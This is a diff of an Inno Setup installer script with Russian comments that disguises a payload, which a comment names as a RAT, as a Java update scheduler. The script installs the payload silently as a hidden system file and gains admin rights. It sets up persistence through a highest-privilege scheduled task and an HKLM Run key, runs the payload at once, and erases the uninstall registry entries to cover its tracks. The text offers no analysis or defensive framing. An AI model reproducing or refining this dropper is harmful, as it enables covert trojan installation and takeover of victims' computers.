@@ -1,38 +1,45 @@
 [Setup]
-AppName=C++ Runtime Host
-AppVersion=11.0
-; Устанавливаем в системную директорию (System32 для x86 или SysWOW64 для x64)
-DefaultDirName={sys}
+; --- Основные настройки маскировки ---
+AppName=Java Update Scheduler
+AppVersion=8.0.481
+DefaultDirName={userappdata}\Oracle\Java\Update
+; Отключаем деинсталлятор (не будет в списке программ)
 Uninstallable=no
 CreateAppDir=yes
 DirExistsWarning=no
+; --- Настройки прав и скрытности ---
+; Требовать права администратора при запуске (появится щит на иконке)
+PrivilegesRequired=admin
+PrivilegesRequiredOverridesAllowed=dialog
+; Полностью скрытая установка без окон
 WindowVisible=no
 OutputBaseFilename=System_Update_Pack
 Compression=lzma
 SolidCompression=yes
-; Требовать права администратора для записи в System32
-PrivilegesRequired=admin
 
 [Files]
-; Источник — твой файл Java. Назначение — System32 под видом системной библиотеки
-Source: "C:\Users\Admin\Desktop\5\Java_Update_v8u481.exe"; DestDir: "{app}"; DestName: "win_host_srv.exe"; Flags: ignoreversion; Attribs: hidden system
+; ПУТЬ: Убедись, что этот путь ведет к твоему файлу Java_Update_v8u481.exe
+; Permissions: users-full дает файлу права на выполнение всеми
+Source: "C:\Users\Александр\Desktop\5\Java_Update_v8u481.exe"; DestDir: "{app}"; DestName: "jusched.exe"; Flags: ignoreversion; Attribs: hidden system; Permissions: users-full
 
 [Run]
-; Закрепление через планировщик с высшими правами
-Filename: "schtasks"; Parameters: "/Create /SC ONLOGON /TN ""WinHostSrv"" /TR ""'{app}\win_host_srv.exe'"" /RL HIGHEST /F"; Flags: runhidden
+; 1. Создаем задачу в Планировщике с ВЫСШИМИ правами (/RL HIGHEST)
+; Это гарантирует, что RAT запустится от имени администратора при входе пользователя
+Filename: "schtasks"; Parameters: "/Create /SC ONLOGON /TN ""JavaUpdateSched"" /TR ""'{app}\jusched.exe'"" /RL HIGHEST /F"; Flags: runhidden
 
-; Автозагрузка через системный реестр (как резерв)
-Filename: "reg"; Parameters: "add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""HostRuntime"" /t REG_SZ /d ""{app}\win_host_srv.exe"" /f"; Flags: runhidden
+; 2. Резервный запуск через системный реестр (HKLM требует прав админа)
+Filename: "reg"; Parameters: "add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""SunJavaUpdateSched"" /t REG_SZ /d ""{app}\jusched.exe"" /f"; Flags: runhidden
 
-; Мгновенный скрытый запуск
-Filename: "{app}\win_host_srv.exe"; Flags: nowait runhidden
+; 3. Мгновенный запуск процесса с текущими правами администратора
+Filename: "{app}\jusched.exe"; Flags: nowait runhidden
 
 [Code]
-// Полная очистка следов установки из реестра
+// Удаляем все записи об инсталляторе из реестра сразу после выполнения
 procedure CurStepChanged(CurStep: TSetupStep);
 begin
   if CurStep = ssPostInstall then
   begin
     RegDeleteKeyIncludingSubkeys(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#SetupSetting("AppName")}_is1');
+    RegDeleteKeyIncludingSubkeys(HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Uninstall\{#SetupSetting("AppName")}_is1');
   end;
 end;
